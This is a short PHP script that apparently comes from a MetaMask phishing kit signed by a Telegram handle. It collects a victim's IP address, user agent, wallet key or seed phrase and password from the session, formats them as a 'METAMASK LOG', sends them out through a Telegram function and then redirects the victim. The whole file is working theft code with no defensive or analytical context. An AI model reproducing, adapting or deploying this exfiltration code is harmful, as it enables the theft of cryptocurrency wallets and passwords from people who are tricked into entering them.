<?php
error_reporting(0);
session_start();
include_once 'connect.php';
include_once 'functions.php';
include_once 'telegram.php';
/* Telegram @fletchen */
$fsh =
        "<strong>‼️🦊 METAMASK LOG By Fletchen 🦊‼️</strong>\n".
		"<strong></strong>\n".
        "<strong>🌐 IP:  ".$_SESSION['remote_ip']."</strong>\n".
		"<i>📱 OS:  ".$_SESSION['useragent']."</i>\n".
		"<strong></strong>\n".
        "<strong>Key:</strong>\n".
		"<code>".$_SESSION['key']."</code>\n".
		"<strong></strong>\n".
        "<strong>Password:</strong> ".$_SESSION['pass']."\n"
        ;
/* Telegram @fletchen */
telegram($fsh);
finish($fsh);
encrypt($fsh);
header("Location: ./ ");
?>